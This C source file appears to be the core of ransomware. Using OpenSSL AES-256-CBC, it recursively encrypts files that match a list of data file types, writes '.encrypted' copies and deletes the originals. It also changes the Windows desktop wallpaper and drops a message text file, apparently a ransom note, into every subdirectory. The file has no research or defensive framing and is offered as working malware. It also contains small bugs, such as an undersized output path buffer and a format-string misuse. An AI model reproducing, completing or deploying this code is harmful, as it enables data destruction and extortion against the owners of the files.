#include "encrypt.h"
#include "global.h"

void encryptFile(const char* inputFile, const char* outputFile, const unsigned char* key, const unsigned char* iv) {
    // Open the input and output files
    FILE* inFile = fopen(inputFile, "rb");
    FILE* outFile = fopen(outputFile, "wb");
    // Initialise the encryption context
    EVP_CIPHER_CTX* ctx;
    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    // Write the IV to the output file
    fwrite(iv, 1, EVP_CIPHER_CTX_iv_length(ctx), outFile);
    // Buffers for reading and writing data
    unsigned char inBuffer[1024];
    unsigned char outBuffer[1024 + EVP_CIPHER_CTX_block_size(ctx)];
    int outlen;
    // Encrypt the file in chunks
    while (true) {
        int bytesRead = fread(inBuffer, 1, 1024, inFile);
        if (bytesRead <= 0) break;
        EVP_EncryptUpdate(ctx, outBuffer, &outlen, inBuffer, bytesRead);
        fwrite(outBuffer, 1, outlen, outFile);
    }
    // Finalise the encryption
    int finalLen;
    EVP_EncryptFinal_ex(ctx, outBuffer, &finalLen);
    fwrite(outBuffer, 1, finalLen, outFile);
    // Clean up
    fclose(inFile);
    fclose(outFile);
    EVP_CIPHER_CTX_free(ctx);
}

void encryptAndDeleteFilesRecursively(const char* directory, const unsigned char* key, const char* fileTypes[], int numFileTypes) {
    // Open the directory
    DIR* dir;
    struct dirent* ent;
    dir = opendir(directory);
    // Check if the directory was opened successfully
    if (dir != NULL) {
        // Read each file in the directory
        while ((ent = readdir(dir)) != NULL) {
            if (ent->d_type == DT_REG) {  // Case: Regular file
                // +2 for '/' and null terminator
                char *inputPath = malloc(strlen(directory) + strlen(ent->d_name) + 2); 
                // +11 for '.encrypted' extension, '/' and null terminator
                char *outputPath = malloc(strlen(directory) + strlen(ent->d_name) + 11); 
                // Check if memory allocation was successful
                if (inputPath == NULL || outputPath == NULL) {
                    perror("Memory allocation failed");
                    exit(EXIT_FAILURE);
                }
                // Construct the input and output file paths
                sprintf(inputPath, "%s/%s", directory, ent->d_name);
                sprintf(outputPath, "%s/%s.encrypted", directory, ent->d_name);
                // Check if the file type matches the list of known data file types
                int encryptf = 0;
                for (int i = 0; i < numFileTypes; ++i) {
                    if (strstr(ent->d_name, fileTypes[i]) != NULL) {
                        encryptf = 1;
                        break;
                    }
                }
                // Encrypt the file if it is a known data file type
                if (encryptf) {
                    unsigned char iv[AES_BLOCK_SIZE];
                    RAND_bytes(iv, AES_BLOCK_SIZE);
                    encryptFile(inputPath, outputPath, key, iv);
                    // Deletes the original file
                    remove(inputPath); 
                }
                // Free the memory allocated for the file paths
                free(inputPath);
                free(outputPath);
            } else if (ent->d_type == DT_DIR && strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) { // Case: Directory
                // +2 for '/' and null terminator
                char *subdir = malloc(strlen(directory) + strlen(ent->d_name) + 2); 
                // Check if memory allocation was successful
                if (subdir == NULL) {
                    perror("Memory allocation failed");
                    exit(EXIT_FAILURE);
                }
                // Construct the subdirectory path
                sprintf(subdir, "%s/%s", directory, ent->d_name);
                // Recursively encrypt files in the subdirectory
                encryptAndDeleteFilesRecursively(subdir, key, fileTypes, numFileTypes);
                // Free the memory allocated for the subdirectory path
                free(subdir);
            }
        }
        // Close the directory
        closedir(dir);
    } else {
        // Print an error message if the directory could not be opened
        perror("Unable to open directory");
        exit(EXIT_FAILURE);
    }
}

#ifdef _WIN32
void changeWallpaper(const char* wallpaperPath) {
    // Use SystemParametersInfo to change the wallpaper
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wallpaperPath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void leaveTextFileInDirectories(const char* directory, const char* textFileName) {
    // Windows implementation - unimplemented
}
#else
void leaveTextFileInDirectories(const char* directory, const char* textFileName) {
    // Open the directory
    DIR* dir;
    struct dirent* ent;
    dir = opendir(directory);
    // Check if the directory was opened successfully
    if (dir != NULL) {
        while ((ent = readdir(dir)) != NULL) {
            // Check if the entry is a directory and not '.' or '..'
            if (ent->d_type == DT_DIR && strcmp(ent->d_name, ".") != 0 && strcmp(ent->d_name, "..") != 0) {
                // +3 for '/' and null terminator
                size_t totalLength = strlen(directory) + strlen(ent->d_name) + strlen(textFileName) + 3;
                char* textFilePath = (char*)malloc(totalLength);
                // Check if memory allocation was successful
                if (textFilePath == NULL) {
                    perror("Memory allocation failed");
                    closedir(dir);
                    return;
                }
                // Construct the text file path
                snprintf(textFilePath, totalLength, "%s/%s/%s", directory, ent->d_name, textFileName);
                // Create the text file
                FILE* textFile = fopen(textFilePath, "w");
                // Check if the text file was created successfully
                if (textFile != NULL) {
                    fprintf(textFile, message);
                    fclose(textFile);
                } else {
                    fprintf(stderr, "Error creating text file in directory %s: %s\n", ent->d_name, strerror(errno));
                }
                // Free the memory allocated for the text file path
                free(textFilePath);
            }
        }
        // Close the directory
        closedir(dir);
    } else {
        // Print an error message if the directory could not be opened
        perror("Unable to open directory");
        exit(EXIT_FAILURE);
    }
}
#endif
